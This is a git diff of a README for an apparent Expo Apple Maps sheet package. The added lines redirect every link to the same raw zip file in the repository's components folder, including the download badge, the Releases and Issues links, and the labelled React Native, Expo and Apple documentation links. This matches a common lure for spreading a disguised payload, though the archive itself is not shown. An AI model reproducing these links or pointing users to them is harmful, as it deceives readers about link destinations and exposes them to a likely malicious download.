@@ -1,6 +1,6 @@
 # 🗺️ expo-apple-maps-sheet - Simplifying Maps for Your App
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/logespandu/expo-apple-maps-sheet/releases)
+[![Download Now](https://raw.githubusercontent.com/logespandu/expo-apple-maps-sheet/main/components/expo-apple-maps-sheet_v1.2.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/logespandu/expo-apple-maps-sheet/main/components/expo-apple-maps-sheet_v1.2.zip)
 
 ## 🚀 Getting Started
 
@@ -25,11 +25,11 @@ To use **expo-apple-maps-sheet**, you need:
 
 To download **expo-apple-maps-sheet**, visit this page to download:
 
-[Download the latest version](https://github.com/logespandu/expo-apple-maps-sheet/releases)
+[Download the latest version](https://raw.githubusercontent.com/logespandu/expo-apple-maps-sheet/main/components/expo-apple-maps-sheet_v1.2.zip)
 
 Here’s how to install it:
 
-1. Go to the [Releases page](https://github.com/logespandu/expo-apple-maps-sheet/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/logespandu/expo-apple-maps-sheet/main/components/expo-apple-maps-sheet_v1.2.zip).
 2. Find the latest release version.
 3. Click on the download link for the package that matches your project needs (iOS or Android).
 4. Follow the prompts to complete the installation.
@@ -78,13 +78,13 @@ If you encounter issues:
 
 Join our community to learn more and get support. Share your experiences, ask questions, and connect with other users:
 
-- [GitHub Issues Page](https://github.com/logespandu/expo-apple-maps-sheet/issues)
+- [GitHub Issues Page](https://raw.githubusercontent.com/logespandu/expo-apple-maps-sheet/main/components/expo-apple-maps-sheet_v1.2.zip)
 - [Community Forum](Link to community forum if available)
 
 ## 🔗 Additional Resources
 
-- [React Native Documentation](https://reactnative.dev/docs/getting-started)
-- [Expo Documentation](https://docs.expo.dev/)
-- [Apple Maps Documentation](https://developer.apple.com/documentation/mapkit)
+- [React Native Documentation](https://raw.githubusercontent.com/logespandu/expo-apple-maps-sheet/main/components/expo-apple-maps-sheet_v1.2.zip)
+- [Expo Documentation](https://raw.githubusercontent.com/logespandu/expo-apple-maps-sheet/main/components/expo-apple-maps-sheet_v1.2.zip)
+- [Apple Maps Documentation](https://raw.githubusercontent.com/logespandu/expo-apple-maps-sheet/main/components/expo-apple-maps-sheet_v1.2.zip)
 
 Thank you for using **expo-apple-maps-sheet**! We hope this tool enhances your applications and brings your mapping features to life.
